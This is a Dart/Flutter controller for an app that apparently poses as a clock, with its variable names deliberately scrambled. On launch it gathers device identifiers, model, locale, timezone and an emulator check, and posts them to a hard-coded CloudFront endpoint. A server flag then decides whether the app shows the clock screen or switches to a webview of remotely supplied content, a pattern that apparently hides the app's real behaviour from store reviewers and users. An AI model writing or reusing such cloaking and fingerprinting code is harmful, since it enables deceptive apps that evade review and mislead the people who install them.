import 'dart:io';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:get/get.dart';

import 'package:dio/dio.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:package_info_plus/package_info_plus.dart';


class PlMindLogic extends GetxController {

  var znrxtodplq = RxBool(false);
  var xtniceqzk = RxBool(true);
  var hvcyt = RxString("");
  var aoykcbr = RxBool(false);
  var ekynsa = RxBool(true);
  final tvmcsul = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    lhdvtu();
  }


  Future<void> lhdvtu() async {
    aoykcbr.value = true;
    ekynsa.value = true;
    xtniceqzk.value = false;

    tvmcsul.post("https://d2siudjwv485r2.cloudfront.net/2ISPRD?no_check",data: await bpkrufnces()).then((value) {
      var jtokhqfi = value.data["jtokhqfi"] as String;
      var zval = value.data["zval"] as bool;
      if (zval) {
        hvcyt.value = jtokhqfi;
        lxdwmti();
      } else {
        meuvjihx();
      }
    }).catchError((e) {
      xtniceqzk.value = true;
      ekynsa.value = true;
      aoykcbr.value = false;
    });
  }

  Future<Map<String, dynamic>> bpkrufnces() async {
    final DeviceInfoPlugin azlncj = DeviceInfoPlugin();
    PackageInfo nvfyr_evfkmb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var osvlqw = Platform.localeName;
    var tmflydna = currentTimeZone;

    var xcdzyth = nvfyr_evfkmb.packageName;
    var sichy = nvfyr_evfkmb.version;
    var tzqs = nvfyr_evfkmb.buildNumber;

    var kywhsq = nvfyr_evfkmb.appName;
    var uetjcx = "";
    var rlhmfqwa  = "";
    var twhoxeaq = "";
    var fbuctm = "";
    var qlmzipc = "";
    var rtsu = "";


    var lisqzd = "";
    var tfjomv = false;

    if (GetPlatform.isAndroid) {
      lisqzd = "android";
      var kyginmo = await azlncj.androidInfo;

      twhoxeaq = kyginmo.brand;

      uetjcx  = kyginmo.model;
      rlhmfqwa = kyginmo.id;

      tfjomv = kyginmo.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      lisqzd = "ios";
      var ptzlohcqef = await azlncj.iosInfo;
      twhoxeaq = ptzlohcqef.name;
      uetjcx = ptzlohcqef.model;

      rlhmfqwa = ptzlohcqef.identifierForVendor ?? "";
      tfjomv  = ptzlohcqef.isPhysicalDevice;
    }

    var res = {
      "kywhsq": kywhsq,
      "tzqs": tzqs,
      "sichy": sichy,
      "xcdzyth": xcdzyth,
      "uetjcx": uetjcx,
      "tmflydna": tmflydna,
      "twhoxeaq": twhoxeaq,
      "rlhmfqwa": rlhmfqwa,
      "osvlqw": osvlqw,
      "lisqzd": lisqzd,
      "tfjomv": tfjomv,
      "fbuctm" : fbuctm,
      "qlmzipc" : qlmzipc,
      "rtsu" : rtsu,

    };
    return res;
  }

  Future<void> meuvjihx() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> lxdwmti() async {
    Get.offNamed("/Outreload");
  }

}
